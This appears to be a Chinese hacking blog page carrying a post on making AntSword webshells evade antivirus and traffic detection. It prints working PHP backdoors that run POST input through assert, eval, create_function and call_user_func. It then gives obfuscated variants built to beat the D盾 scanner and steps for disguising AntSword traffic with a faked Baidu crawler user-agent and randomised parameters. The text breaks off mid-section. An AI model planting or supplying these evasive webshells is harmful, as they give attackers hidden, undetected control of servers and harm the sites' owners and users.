<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/page/2/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于蚁剑免杀的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-26 22:39:06" itemprop="dateCreated datePublished" datetime="2020-07-26T22:39:06+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-28 18:38:42" itemprop="dateModified" datetime="2020-07-28T18:38:42+08:00">2020-07-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们直接使用蚁剑这种比较出名的shell管理工具，在一些防护比较严的情况下，可能过一会会就被发现甚至关站，因此去除蚁剑的特征或者对shell免杀都是特别重要的，我之前并未接触过这方面的知识，写这篇文章的目的就是记录自己学习的一个过程，所以开始吧。</span><br></pre></td></tr></table></figure>

<p>我认为特征处理有几个部分吧，一个是静态代码特征，比如我们直接使用蚁剑的马，这种马如果我们没有进行过任何处理直接上传就非常有可能在上传的时候被干掉，也就是说如果在上传的时候就被干掉了，或者上传之后被干掉了，问题都出在传的马被杀了。还有一种情况就是我们的马传上去了，而且也能访问到，然后使用蚁剑连接的时候发现连接被阻断同时马被杀了，这个就是流量方面的特征的问题了。</p>
<h3 id="自带shell分析"><a href="#自带shell分析" class="headerlink" title="自带shell分析"></a>自带shell分析</h3><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>这里首先以php为例，因为其语法变化最为灵活，也是相对来说比较容易做处理的，首先我们看下自带的马是什么样子的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$ant($_POST[&#39;ant&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个代码非常容易理解，就是将assert关键字进行base64编码，但是我使用assert这个shell会有一个问题，就是蚁剑连不上，通过抓包分析， 在蚁剑连接的时候会发送一个数据包。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727103950002.png" alt="image-20200727103950002"></p>
<p>因为发送这个数据后返回为空，所以蚁剑显示连接不上，但是我这里将这串数据改成phpinfo()也是可以正常执行的，也就是说这里并不是因为assert不能正常执行命令的问题。我们将这串代码解码后看看,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return $out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;97a7a&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;777a7fdcd7c&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $D &#x3D; dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    if ($D &#x3D;&#x3D; &quot;&quot;) $D &#x3D; dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">    $R &#x3D; &quot;&#123;$D&#125;	&quot;;</span><br><span class="line">    if (substr($D, 0, 1) !&#x3D; &quot;&#x2F;&quot;) &#123;</span><br><span class="line">        foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. &#x3D; &quot;&#123;$L&#125;:&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $R. &#x3D; &quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $R. &#x3D; &quot;	&quot;;</span><br><span class="line">    $u &#x3D; (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;;</span><br><span class="line">    $s &#x3D; ($u) ? $u[&quot;name&quot;] : @get_current_user();</span><br><span class="line">    $R. &#x3D; php_uname();</span><br><span class="line">    $R. &#x3D; &quot;	&#123;$s&#125;&quot;;</span><br><span class="line">    echo $R;;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>

<p>大致的意思会输出一些内容  随机字符串+环境变量+随机字符串，如果用eval代替assert是完全没问题的，我查了下资料，assert是不能执行多个语句的，eval可以，所以这里使用assert会有返回为空的问题。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114425121.png" alt="image-20200727114425121"></p>
<p>这个问题可以使用base64编码的问题解决，编码后的数据包如下，可以看到ant这个参数传入的是一句话，因此就可以通过assert执行成功。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727114808620.png" alt="image-20200727114808620"></p>
<p>这里就是蚁剑使用assert的shell的一个坑，<strong>如果使用assert不要使用默认编码。</strong></p>
<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>这种方式是通过create_function创建匿名函数来执行命令的，shell的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$ant&#x3D;create_function(&quot;&quot;, base64_decode(&#39;QGV2YWwoJF9QT1NUWyJhbnQiXSk7&#39;));</span><br><span class="line">$ant();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="php-custom-script-for-mysql"><a href="#php-custom-script-for-mysql" class="headerlink" title="php_custom_script_for_mysql"></a>php_custom_script_for_mysql</h4><p>使用这种方式的shell，需要在连接类型上选择custom，否则会连接不上。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727131327779.png" alt="image-20200727131327779"></p>
<p>使用这种模式我们需要上传的代码是比较长的，大概13k左右。好处就是在数据包中没有明显的eval这样命令执行的名字出现，因为作者已经在custom的代码中进行了实现。比如我们要测试连接。我拿create_funcion和custom的数据包进行对比，内容如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132341964.png" alt="image-20200727132341964"></p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132412642.png" alt="image-20200727132412642"></p>
<p>为什么A就可以返回内容，我们大概分析下代码。</p>
<p>首先获取$pwd也就是我们的密码的参数值，调用EC字符串编解码的函数进行处理</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132702622.png" alt="image-20200727132702622"></p>
<p>根据pwd的值的不同调用不同的函数做对应的操作</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132825291.png" alt="image-20200727132825291"></p>
<p>我们在看下BaseInfo()函数具体执行的操作，这里的代码和我们使用其他模式发送的数据是一样的，就是获取服务端的基本信息进行输出，</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727132906141.png" alt="image-20200727132906141"></p>
<p>custom模式我们大概了解了，再看下一个shell。</p>
<h4 id="php-eval-rsa-script"><a href="#php-eval-rsa-script" class="headerlink" title="php_eval_rsa_script"></a>php_eval_rsa_script</h4><p>使用这个shell的条件是需要开启openssl的，而且我测试php5.4.45没成功，在php5.3.29下是可以的。</p>
<p>在phpinfo中查看是否开启了openssl</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727143928992.png" alt="image-20200727143928992"></p>
<p>开启了openssl后，我们找到蚁剑的编码管理功能，有个rsa配置的功能。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144031550.png" alt="image-20200727144031550"></p>
<p>打开后内容如下，主要分为三个部分，RSA的公钥，私钥和php代码。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144108286.png" alt="image-20200727144108286"></p>
<p>我们将生成的php代码传到服务端，因为这里获取数据是通过公钥解密的，所以我们需要使用私钥对我们传递的数据进行加密，因此需要创建一个编码器。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144333763.png" alt="image-20200727144333763"></p>
<p>创建好编码器后，我们在连接的时候选择我们创建的rsa编码器即可</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144450235.png" alt="image-20200727144450235"></p>
<p>使用rsa加密后数据包的内容如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727144526707.png" alt="image-20200727144526707"></p>
<h3 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h3><p>首先，抛开custom类型的shell，我们发现其他的shell本质上都是构造了一个命令执行的点，所以我们只要构建一个命令执行的点就可以了。</p>
<p>我这里以D盾来测试shell的静态免杀，我将蚁剑自带的assert那个马扔上去d盾会爆已知后门，然后我尝试将里面的关键字进行更改，已经无法造成一个命令执行的功能了，D盾还是会爆已知后门，也就是说D盾这里检测应该是进行了某些关键字的匹配的。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150401374.png" alt="image-20200727150401374"></p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150414729.png" alt="image-20200727150414729"></p>
<p>我将第二行的内容删掉，D盾还是会爆二级，也就是说如果我们想要静态免杀完全过D盾，不能直接使用变量名做函数名这种方式。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150635040.png" alt="image-20200727150635040"></p>
<p>而且这里和是否接收参数也无关，都会爆的。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727150819212.png" alt="image-20200727150819212"></p>
<p>我发现D盾在这里进行拦截时是会去匹配括号是否闭合的，那我们就可以测试，当我假如复杂的括号时，能否绕过这个规则。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727155255367.png" alt="image-20200727155255367"></p>
<p>这样虽然可以达到绕过的目的，但是也不符合php的语法。所以我想将括号里的内容注释掉，不过加了注释后又会被拦截。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727162618952.png" alt="image-20200727162618952"></p>
<p>我尝试在这些括号的两边加上单双引号，也是无法绕过的，我看网上之前有人加了反引号进行绕过，可能是版本更新了吧，我通过那种方式无法绕过，好吧，我承认这个点我绕不过去了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果没有思路了，那就是自己的知识受限了，因此我去看了看其他人的文章</span><br></pre></td></tr></table></figure>

<p>有篇文章也是用了变量函数，但是并没有被拦截。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727170037503.png" alt="image-20200727170037503"></p>
<p>所以D盾的拦截可变变量的规则是在$xx()在行首的时候，然后我试了试使用上面那种方式的shell，这个仍然还可以免杀。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727171248076.png" alt="image-20200727171248076"></p>
<p>但是能不能免杀并不是我们的重点，因为是学习嘛，所以得知道为什么他就能免杀了。一方面是上面我分析的绕过了变量函数的检测，我再测试了下，当我们不使用可变变量的形式而是直接assert调用的话是会被拦的。所以就使用了两个技术</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.变量函数的检测绕过</span><br><span class="line">2.通过变量函数来将函数关键字和函数调用部分分开了，破坏了类似于assert()这样的拦截规则。</span><br></pre></td></tr></table></figure>

<p>这个是最主要的绕过的点，如果被其他的杀软拦截了，我们还可以进行各种变形。</p>
<p><strong>方法一：关键字拆分</strong></p>
<p>关于assert这个关键字的各种变形</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;a&#39;.&#39;s&#39;.&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;;   &#x2F;&#x2F;拼接</span><br><span class="line">$a &#x3D; substr(&#39;1a&#39;,1).substr(&#39;1as&#39;,2).&#39;s&#39;.&#39;e&#39;.&#39;r&#39;.&#39;t&#39;; &#x2F;&#x2F;拼接+截取</span><br><span class="line">$a &#x3D; strtr(&#39;azxcvt&#39;,&#39;zxcv&#39;,&#39;sser&#39;);&#x2F;&#x2F;截取替换</span><br><span class="line">$a &#x3D; substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2); &#x2F;&#x2F;替换</span><br><span class="line">$a&#x3D;chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);</span><br></pre></td></tr></table></figure>

<p><strong>方法二：改变调用函数</strong></p>
<p>上面的shell我们是调用assert达到代码执行的目的，那么有没有那个函数可以替换assert这个函数呢。本来以为会有很多函数，查了下发现没有那种可以直接调用的，不过可以通过一些回调函数来解决。我以call_user_func为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;call_user_func&quot;;</span><br><span class="line">$c&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当然也可以拿其他函数进行变形绕过，这里只是给一个思路。</p>
<p><strong>方法三：改变array+var_dump</strong></p>
<p>通过前面的绕过，我们知道这种绕过Dd盾方法的核心在于可变函数的调用方式没有被检测出来，也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(&#39;&#39;&#x3D;&gt;$a($c,$_POST[&#39;ant&#39;]));</span><br></pre></td></tr></table></figure>

<p>那么我们在这部分要绕过的点就是有没有哪些调用方式可以放在可变函数的前面，我尝试写个自定义函数来进行绕过，但是使用这种方法不能绕过。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200727214520026.png" alt="image-20200727214520026"></p>
<p>之前我们调用的是var_dump,也可以调用其他方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;]));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>还可以这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;&quot;assert&quot;;</span><br><span class="line">	$arr &#x3D; new ArrayObject(array(&#39;&#39;&#x3D;&gt;$a($_POST[&#39;ant&#39;])));</span><br><span class="line">	$arr-&gt;uksort();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>好了，关于静态免杀先学到这，其他的方式当然还有很多，我只是挑了一个点而已。</p>
<h3 id="动态免杀"><a href="#动态免杀" class="headerlink" title="动态免杀"></a>动态免杀</h3><p>上面的操作只是帮我们过了一个shell查杀工具的静态查杀，但是有时候会有这样的情况，就是shell传上去好好的，也没杀，只要一连接就被干掉了，这是为什么呢？这个就涉及到流量方面的免杀了。</p>
<h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><p>关于蚁剑这款工具，功能很强大，用起来也挺舒服，但是他出名啊，出名的话就会被很多厂商拿去分析，所以我们在使用蚁剑的时候需要去除我们使用蚁剑和服务端进行交互的流量特征，那么都有什么特征呢？</p>
<h5 id="特征一：user-agent"><a href="#特征一：user-agent" class="headerlink" title="特征一：user-agent"></a>特征一：user-agent</h5><p>​    这个特征是一个非常明显的特征，就和sqlmap的user-agent一样，都是和工具相关的，我们看下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090059610.png" alt="image-20200728090059610"></p>
<p>这个特征非常明显吧，所以我们使用蚁剑这个特征是一定要改的，我们找到/modules/request.js文件，有个USER_AGENT</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090412292.png" alt="image-20200728090412292"></p>
<p>我们将它改成百度的爬虫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (compatible; Baiduspider-render&#x2F;2.0;+http:&#x2F;&#x2F;www.baidu.com&#x2F;search&#x2F;spider.html)</span><br></pre></td></tr></table></figure>

<p>网上还有人说，需要更改/modules/update.js的请求头，但我看了下这个功能是和github进行交互的，不是和目标交互的流量，所以我认为可以不改吧。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728090753980.png" alt="image-20200728090753980"></p>
<p>然后重启蚁剑，USER-AGENT内容就已经成功被修改了。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091048839.png" alt="image-20200728091048839"></p>
<h5 id="特征二：变量规则"><a href="#特征二：变量规则" class="headerlink" title="特征二：变量规则"></a>特征二：变量规则</h5><p>首先来看下蚁剑的一个数据包，注意看下我圈出来的部分，这里面字符的长度是固定的，在变量那部分，长度是固定的14位，返回包部分前面是9位，后面是7位。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728091745973.png" alt="image-20200728091745973"></p>
<p>我们新建一个编码器对发送的数据进行处理，编码器里面有个默认的实例，是base64的编码器，就是我们上面图中发送数据使用的编码器，我们学习下是怎么处理的。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728092809554.png" alt="image-20200728092809554"></p>
<p>作者也非常贴心的把注释写的非常清楚，首先是生成一个14位长度的随机值当作参数名，然后把我们需要传递的内容base64编码进行赋值，然后在pwd中传入代码执行的代码。</p>
<p>首先看下变量长度的问题如何解决，可以通过随机生成一个长度字段，再去根据长度去随机生成相应的内容，这样就可以确保每次发起请求的参数长度是变化的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br></pre></td></tr></table></figure>

<p>这样我们发送的参数名的长度就是变化的了。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728102211355.png" alt="image-20200728102211355"></p>
<p>但是我们仍然有一个核心的问题没有解决，就是在我们发送的流量里面会有eval，这个如何解决呢？</p>
<h5 id="特征三：eval特征处理"><a href="#特征三：eval特征处理" class="headerlink" title="特征三：eval特征处理"></a>特征三：eval特征处理</h5><p>我参考了蚁剑作者关于这部分处理的文章，他是将eval这部分进行了编码，如果直接对eval进行编码，那在服务端是无法识别这个流量的，因此服务端也需要对这个数据进行base64解码，使用这种方法需要稍微改变一下服务端的代码。</p>
